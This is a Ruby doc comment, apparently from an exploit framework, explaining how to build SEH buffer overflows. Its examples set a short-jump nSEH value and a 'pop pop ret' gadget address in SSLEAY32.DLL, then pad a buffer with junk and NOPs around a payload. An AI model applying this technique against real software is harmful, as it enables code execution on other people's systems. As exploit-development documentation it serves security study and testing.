      # Methods for building Structured Exception Handler (SEH) buffer
      # overflows.
      #
      # ## Example
      #
      #     include Mixins::SEH
      #
      #     def build
      #       nseh = 0x06eb9090 # short jump 6 bytes
      #       seh  = 0x1001ae86 # pop pop ret 1001AE86 SSLEAY32.DLL
      #
      #       buffer = seh_buffer_overflow(length: 1024, nops: 16, payload: payload, nseh: nseh, seh: seh)
      #       # ...
      #     end
      #
      # If you want more control over how the buffer is constructed:
      #
      #     include Mixins::SEH
      #
      #     def build
      #       nseh = 0x06eb9090 # short jump 6 bytes
      #       seh  = 0x1001ae86 # pop pop ret 1001AE86 SSLEAY32.DLL
      #
      #       buffer = junk(1024) + seh_record(nseh,seh) + nops(16) + payload
      #       # ...
